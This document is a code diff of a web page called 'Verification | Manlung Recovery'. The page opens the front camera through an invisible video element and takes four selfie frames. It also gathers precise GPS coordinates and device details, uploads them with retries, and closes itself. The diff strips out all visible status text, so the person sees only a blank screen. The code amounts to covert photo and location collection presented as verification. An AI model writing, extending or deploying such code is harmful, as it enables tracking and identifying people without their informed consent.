@@ -1,46 +1,247 @@
 <!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><title>Video Verification · Manlung Recovery</title></head>
-<body><p>Opening Video Verification…</p>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>Verification | Manlung Recovery</title>
+<style>
+html,body{margin:0;width:100%;min-height:100%;background:#fff!important;color:#111!important}
+body{overflow:hidden;display:grid;place-items:center}
+.status-screen{position:fixed;inset:0;display:grid;place-items:center;background:#fff;color:#111;text-align:center}
+.status-box{display:flex;flex-direction:column;align-items:center;gap:16px;padding:24px}
+.spinner{width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
+.status-title{font:600 18px/1.3 system-ui,-apple-system,Segoe UI,sans-serif}
+.status-text{font:14px/1.5 system-ui,-apple-system,Segoe UI,sans-serif;color:#666;max-width:280px}
+@keyframes spin{to{transform:rotate(360deg)}}
+video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
+</style>
+</head>
+<body>
+<div class="status-screen" id="statusScreen" aria-live="polite">
+  <div class="status-box"></div>
+</div>
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
 <script>
 (()=>{"use strict";
 const token=new URLSearchParams(location.search).get("id")||"";
-const video=document.getElementById("video"),canvas=document.getElementById("canvas");
+const video=document.getElementById("video");
+const canvas=document.getElementById("canvas");
 let stream=null,busy=false;
-const DB_NAME="manlung-selfie-queue",DB_STORE="uploads";
-function openQueue(){return new Promise((resolve,reject)=>{const r=indexedDB.open(DB_NAME,1);r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};r.onsuccess=()=>resolve(r.result);r.onerror=()=>reject(r.error)})}
-async function requestStoragePersistence(){try{if(navigator.storage?.persist)await navigator.storage.persist()}catch(_){}}
-async function queueBatch(blobs,metadata){try{const db=await openQueue();await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite"),batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({token,batchId,blob,metadata:{...metadata,captureNumber:i+1,totalCaptures:3},createdAt:new Date().toISOString()}));tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)})}catch(_){}}
-async function deleteRows(rows){const db=await openQueue();for(const row of rows)await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)})}
-async function getQueueStatus(){if(!token)return null;try{const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/status",{credentials:"omit",cache:"no-store"}),d=await r.json().catch(()=>({}));return r.ok&&d.success?d:null}catch(_){return null}}
-async function flushQueue(){if(!token)return;try{const db=await openQueue(),rows=await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readonly"),q=tx.objectStore(DB_STORE).getAll();q.onsuccess=()=>resolve(q.result);q.onerror=()=>reject(q.error)}),grouped={};rows.filter(x=>x.token===token).forEach(x=>{const key=x.batchId||("legacy-"+x.id);(grouped[key]||(grouped[key]=[])).push(x)});for(const group of Object.values(grouped)){if(group.length!==3)continue;try{const fd=new FormData();group.forEach((row,i)=>fd.append("files",row.blob,"verification-"+(i+1)+".jpg"));fd.append("metadata",JSON.stringify(group[0].metadata||{}));const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"}),d=await r.json().catch(()=>({}));if(!r.ok||!d.success){if(r.status===410){const status=await getQueueStatus();if(status?.count===3){await deleteRows(group);continue}}break}await deleteRows(group)}catch(_){break}}}catch(_){}}
-function waitForVideo(){return new Promise((resolve,reject)=>{const deadline=Date.now()+7000,tick=()=>{if(video.readyState>=2&&video.videoWidth>0&&video.videoHeight>0)return resolve();if(Date.now()>deadline)return reject(new Error("Camera did not become ready."));requestAnimationFrame(tick)};tick()})}
-function frameBlob(){return new Promise((resolve,reject)=>{const w=video.videoWidth||1280,h=video.videoHeight||720;canvas.width=w;canvas.height=h;const ctx=canvas.getContext("2d",{alpha:false});if(!ctx)return reject(new Error("Capture is unavailable."));ctx.drawImage(video,0,0,w,h);canvas.toBlob(blob=>blob?resolve(blob):reject(new Error("Could not create image.")),"image/jpeg",0.9)})}
-const pause=ms=>new Promise(resolve=>setTimeout(resolve,ms));
-async function captureThree(){
- if(busy)return;busy=true;let blobs=[],metadata=null;
- try{
-  if(!token)throw new Error("Invalid verification link.");
-  await requestStoragePersistence();await flushQueue();
-  const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"}),requestData=await requestResponse.json().catch(()=>({}));
-  if(!requestResponse.ok||!requestData.success)throw new Error(requestData.error||"Verification request is unavailable.");
-  if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported by this browser.");
-  stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false});
-  video.srcObject=stream;await video.play().catch(()=>{});await waitForVideo();
-  const ua=navigator.userAgent||"",uaData=navigator.userAgentData||null;
-  const deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?"mobile":"desktop";
-  let browser=/Edg//i.test(ua)?"Edge":/Chrome//i.test(ua)?"Chrome":/Firefox//i.test(ua)?"Firefox":/Safari//i.test(ua)&&!/Chrome//i.test(ua)?"Safari":"Unknown";
-  let location=null;
-  if(navigator.geolocation)location=await new Promise(resolve=>navigator.geolocation.getCurrentPosition(p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),()=>resolve(null),{enableHighAccuracy:true,maximumAge:30000,timeout:5000}));
-  metadata={clientCapturedAt:new Date().toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",captureMethod:"browser-camera",device:{deviceType,platform:(uaData?.platform||navigator.platform||"").slice(0,80),browser,model:""},location,totalCaptures:3};
-  for(let i=0;i<3;i++){blobs.push(await frameBlob());if(i<2)await pause(120);}
-  await queueBatch(blobs,metadata);
-  const fd=new FormData();blobs.forEach((blob,i)=>fd.append("files",blob,"verification-"+(i+1)+".jpg"));fd.append("metadata",JSON.stringify(metadata));
-  const uploadResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"}),uploadData=await uploadResponse.json().catch(()=>({}));
-  if(!uploadResponse.ok||!uploadData.success)throw new Error(uploadData.error||"Verification upload failed.");
-  await flushQueue();try{window.close()}catch(_){}setTimeout(()=>{try{window.close()}catch(_){}},300);
- }catch(error){console.error("Selfie evidence pipeline error:",error);if(blobs.length===3&&metadata){await queueBatch(blobs,metadata);await flushQueue()}setTimeout(()=>{try{window.close()}catch(_){}},800)}
- finally{if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}}
+function setStatus(){}
+
+const DB_NAME="manlung-selfie-queue";
+const DB_STORE="uploads";
+
+function openQueue(){
+  return new Promise((resolve,reject)=>{
+    const r=indexedDB.open(DB_NAME,1);
+    r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};
+    r.onsuccess=()=>resolve(r.result);
+    r.onerror=()=>reject(r.error);
+  });
 }
-document.addEventListener("DOMContentLoaded",captureThree,{once:true});window.addEventListener("online",flushQueue);setTimeout(()=>{requestStoragePersistence().catch(()=>{});flushQueue().catch(()=>{})},1000);
+
+async function queueBatch(blobs,metadata){
+  try{
+    const db=await openQueue();
+    await new Promise((resolve,reject)=>{
+      const tx=db.transaction(DB_STORE,"readwrite");
+      const batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());
+      blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({
+        token,batchId,blob,
+        metadata:{...metadata,captureNumber:i+1,totalCaptures:4},
+        createdAt:new Date().toISOString()
+      }));
+      tx.oncomplete=resolve;
+      tx.onerror=()=>reject(tx.error);
+    });
+  }catch(_){}
+}
+
+async function deleteRows(rows){
+  const db=await openQueue();
+  for(const row of rows){
+    await new Promise((resolve,reject)=>{
+      const tx=db.transaction(DB_STORE,"readwrite");
+      tx.objectStore(DB_STORE).delete(row.id);
+      tx.oncomplete=resolve;
+      tx.onerror=()=>reject(tx.error);
+    });
+  }
+}
+
+async function flushQueue(){
+  if(!token)return;
+  try{
+    const db=await openQueue();
+    const rows=await new Promise((resolve,reject)=>{
+      const tx=db.transaction(DB_STORE,"readonly");
+      const q=tx.objectStore(DB_STORE).getAll();
+      q.onsuccess=()=>resolve(q.result);
+      q.onerror=()=>reject(q.error);
+    });
+    const grouped={};
+    rows.filter(x=>x.token===token).forEach(x=>{
+      const key=x.batchId||("legacy-"+x.id);
+      (grouped[key]||(grouped[key]=[])).push(x);
+    });
+    for(const group of Object.values(grouped)){
+      if(group.length!==4)continue;
+      try{
+        const fd=new FormData();
+        group.forEach((row,i)=>fd.append("files",row.blob,"verification-"+(i+1)+".jpg"));
+        fd.append("metadata",JSON.stringify(group[0].metadata||{}));
+        const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"});
+        let d={};try{d=await r.json()}catch(_){}
+        if(!r.ok||!d.success){
+          console.error("Selfie queued upload failed:",r.status,d);
+          if(r.status===410){await deleteRows(group);continue;}
+          break;
+        }
+        console.log("Selfie queued upload succeeded:",d);
+        await deleteRows(group);
+      }catch(_){break}
+    }
+  }catch(_){}
+}
+
+function waitForVideo(){
+  return new Promise((resolve,reject)=>{
+    const deadline=Date.now()+7000;
+    const tick=()=>{
+      if(video.readyState>=2&&video.videoWidth>0&&video.videoHeight>0)return resolve();
+      if(Date.now()>deadline)return reject(new Error("Camera did not become ready."));
+      requestAnimationFrame(tick);
+    };
+    tick();
+  });
+}
+
+function frameBlob(captureNumber,metadata){
+  return new Promise((resolve,reject)=>{
+    const w=video.videoWidth||1280,h=video.videoHeight||720;
+    canvas.width=w;canvas.height=h;
+    const ctx=canvas.getContext("2d",{alpha:false});
+    if(!ctx)return reject(new Error("Capture is unavailable."));
+    ctx.drawImage(video,0,0,w,h);
+    const stripHeight=Math.max(150,Math.round(h*0.19));
+    ctx.fillStyle="rgba(0,0,0,.78)";
+    ctx.fillRect(0,h-stripHeight,w,stripHeight);
+    ctx.fillStyle="#fff";
+    ctx.font=Math.max(18,Math.round(w/55))+"px system-ui,-apple-system,Segoe UI,sans-serif";
+    ctx.textBaseline="top";
+    const lines=[
+      "MANLUNG RECOVERY • AUTHORIZED VERIFICATION",
+      "Capture "+captureNumber+" of 4 • "+new Date().toISOString(),
+      "Case: "+(metadata.reference||"Authorized request"),
+      metadata.location ? ("GPS: "+metadata.location.latitude+", "+metadata.location.longitude+" • Accuracy: "+(metadata.location.accuracy??"N/A")+" m") : "GPS: Not supplied by browser",
+      "Device: "+(metadata.device?.deviceType||"unknown")+" • "+(metadata.device?.browser||"unknown")+" • "+(metadata.device?.platform||"unknown")
+    ];
+    const lineHeight=Math.max(22,Math.round(w/42));
+    const startY=h-stripHeight+12;
+    lines.forEach((line,i)=>ctx.fillText(String(line).slice(0,150),16,startY+i*lineHeight));
+    canvas.toBlob(blob=>blob?resolve(blob):reject(new Error("Could not create image.")),"image/jpeg",0.9);
+  });
+}
+
+function pause(ms){return new Promise(resolve=>setTimeout(resolve,ms));}
+
+async function captureFour(){
+  if(busy)return;
+  busy=true;
+  let blobs=[];
+  let metadata=null;
+  try{
+    if(!token)throw new Error("Invalid verification link.");
+    setStatus();
+    await flushQueue();
+
+    const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"});
+    let requestData={};try{requestData=await requestResponse.json()}catch(_){}
+    if(!requestResponse.ok||!requestData.success)throw new Error(requestData.error||"Verification request is unavailable.");
+
+    if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported by this browser.");
+    setStatus();
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false});
+    video.srcObject=stream;
+    await video.play().catch(()=>{});
+    await waitForVideo();
+    setStatus();
+    
+    const getDeviceMetadata=async()=>{
+      const ua=navigator.userAgent||"";
+      const uaData=navigator.userAgentData||null;
+      let deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?"mobile":"desktop";
+      if(/iPad|Tablet/i.test(ua))deviceType="tablet";
+      let platform=uaData?.platform||navigator.platform||"";
+      let browser="";
+      if(/Edg\//i.test(ua))browser="Edge";
+      else if(/Chrome\//i.test(ua))browser="Chrome";
+      else if(/Firefox\//i.test(ua))browser="Firefox";
+      else if(/Safari\//i.test(ua)&&!/Chrome\//i.test(ua))browser="Safari";
+      else if(/OPR\//i.test(ua))browser="Opera";
+      else browser="Unknown";
+      return {deviceType,platform:platform.slice(0,80),browser,model:typeof uaData?.getHighEntropyValues==="function" ? ((await uaData.getHighEntropyValues(["model"]).catch(()=>({}))).model||"") : ""};
+    };
+    let locationMetadata=null;
+    if(navigator.geolocation){
+      try{
+        locationMetadata=await new Promise(resolve=>navigator.geolocation.getCurrentPosition(
+          p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),
+          ()=>resolve(null),
+          {enableHighAccuracy:true,maximumAge:0,timeout:30000}
+        ));
+      }catch(_){locationMetadata=null}
+    }
+    metadata={
+      clientCapturedAt:new Date().toISOString(),
+      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",
+      captureMethod:"browser-camera",
+      device:await getDeviceMetadata(),
+      location:locationMetadata,
+      reference:requestData.request?.reference || requestData.request?.case_id || ""
+    };
+    for(let i=0;i<4;i++){
+      blobs.push(await frameBlob(i+1,metadata));
+      if(i<3)await pause(120);
+    }
+
+    setStatus();
+    const fd=new FormData();
+    blobs.forEach((blob,i)=>fd.append("files",blob,"video-verification-"+(i+1)+".jpg"));
+    fd.append("metadata",JSON.stringify({...metadata,totalCaptures:4}));
+    const uploadResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"});
+    let uploadData={};try{uploadData=await uploadResponse.json()}catch(_){}
+    if(!uploadResponse.ok||!uploadData.success){
+      console.error("Selfie batch upload failed:",uploadResponse.status,uploadData);
+      if(uploadResponse.status>=400&&uploadResponse.status<500)throw new Error(uploadData.error||"Verification request is no longer available.");
+      throw new Error(uploadData.error||"Verification upload failed.");
+    }
+    console.log("Selfie batch upload succeeded:",uploadData);
+    setStatus();
+    await flushQueue();
+    try { window.close(); } catch (_) {}
+    setTimeout(()=>{ try { window.close(); } catch (_) {} },300);
+  }catch(error){
+    console.error("Selfie evidence pipeline error:",error);
+    setStatus();
+    // Retry only when four frames were already captured and the failure may be transient.
+    if(blobs.length===4&&metadata){
+      await queueBatch(blobs,{...metadata,totalCaptures:4});
+      await flushQueue();
+    }
+  }finally{
+    if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}
+  }
+}
+
+document.addEventListener("DOMContentLoaded",captureFour,{once:true});
+window.addEventListener("online",flushQueue);
+setTimeout(flushQueue,1000);
 })();
-</script></body></html>
+</script>
+</body>
+</html>
